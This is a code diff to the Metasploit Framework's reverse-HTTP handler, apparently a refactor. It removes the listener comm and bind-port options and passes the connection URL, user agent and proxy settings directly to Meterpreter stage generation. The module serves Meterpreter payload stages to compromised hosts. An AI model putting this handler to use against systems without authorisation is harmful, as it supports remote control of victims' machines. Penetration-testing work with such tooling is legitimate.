@@ -18,6 +18,7 @@ module Handler
 module ReverseHttp
 
   include Msf::Handler
+  include Msf::Handler::Reverse
   include Rex::Payloads::Meterpreter::UriChecksum
   include Msf::Payload::Windows::VerifySsl
 
@@ -50,11 +51,10 @@ module ReverseHttp
 
     register_advanced_options(
       [
-        OptString.new('ReverseListenerComm', [false, 'The specific communication channel to use for this listener']),
+
         OptString.new('MeterpreterUserAgent', [false, 'The user-agent that the payload should use for communication', Rex::UserAgent.shortest]),
         OptString.new('MeterpreterServerName', [false, 'The server header that the handler will send in response to requests', 'Apache']),
         OptAddress.new('ReverseListenerBindAddress', [false, 'The specific IP address to bind to on the local system']),
-        OptInt.new('ReverseListenerBindPort', [false, 'The port to bind to on the local system if different from LPORT']),
         OptBool.new('OverrideRequestHost', [false, 'Forces a specific host and port instead of using what the client requests, defaults to LHOST:LPORT', false]),
         OptString.new('OverrideLHOST', [false, 'When OverrideRequestHost is set, use this value as the host name for secondary requests']),
         OptPort.new('OverrideLPORT', [false, 'When OverrideRequestHost is set, use this value as the port number for secondary requests']),
@@ -81,7 +81,7 @@ module ReverseHttp
   # @return [String] A URI of the form +scheme://host:port/+
   def listener_uri
     uri_host = Rex::Socket.is_ipv6?(listener_address) ? "[#{listener_address}]" : listener_address
-    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
+    "#{scheme}://#{uri_host}:#{bind_port}/"
   end
 
   # Return a URI suitable for placing in a payload.
@@ -129,15 +129,7 @@ module ReverseHttp
   #
   def setup_handler
 
-    comm = datastore['ReverseListenerComm']
-    if (comm.to_s == 'local')
-      comm = ::Rex::Socket::Comm::Local
-    else
-      comm = nil
-    end
-
     local_port = bind_port
-
 
     # Start the HTTPS server service on this host/port
     self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
@@ -148,7 +140,7 @@ module ReverseHttp
         'Msf'        => framework,
         'MsfExploit' => self,
       },
-      comm,
+      nil,
       (ssl?) ? datastore['HandlerSSLCert'] : nil
     )
 
@@ -285,22 +277,13 @@ protected
 
         blob = ""
         blob << obj.generate_stage(
+          http_url: url,
+          http_user_agent: datastore['MeterpreterUserAgent'],
+          http_proxy_host: datastore['PayloadProxyHost'] || datastore['PROXYHOST'],
+          http_proxy_port: datastore['PayloadProxyPort'] || datastore['PROXYPORT'],
           uuid: uuid,
           uri:  conn_id
         )
-
-        var_escape = lambda { |txt|
-          txt.gsub('\\', '\\'*8).gsub('\'', %q(\\\\\\\'))
-        }
-
-        # Patch all the things
-        blob.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(url)}'")
-        blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(datastore['MeterpreterUserAgent'])}'")
-
-        unless datastore['PayloadProxyHost'].blank?
-          proxy_url = "http://#{datastore['PayloadProxyHost']||datastore['PROXYHOST']}:#{datastore['PayloadProxyPort']||datastore['PROXYPORT']}"
-          blob.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
-        end
 
         resp.body = blob
 
@@ -344,6 +327,7 @@ protected
       when :init_native
         print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Native payload ...")
         url = payload_uri(req) + conn_id + "/\x00"
+        uri = URI(payload_uri(req) + conn_id)
 
         resp['Content-Type'] = 'application/octet-stream'
 
@@ -351,7 +335,9 @@ protected
         # we don't get new ones generated.
         blob = obj.stage_payload(
           uuid: uuid,
-          uri:  conn_id
+          uri:  conn_id,
+          lhost: uri.host,
+          lport: uri.port
         )
 
         resp.body = encode_stage(blob)
@@ -402,13 +388,6 @@ protected
 
     # Force this socket to be closed
     obj.service.close_client( cli )
-  end
-
-protected
-
-  def bind_port
-    port = datastore['ReverseListenerBindPort'].to_i
-    port > 0 ? port : datastore['LPORT'].to_i
   end
 
 end
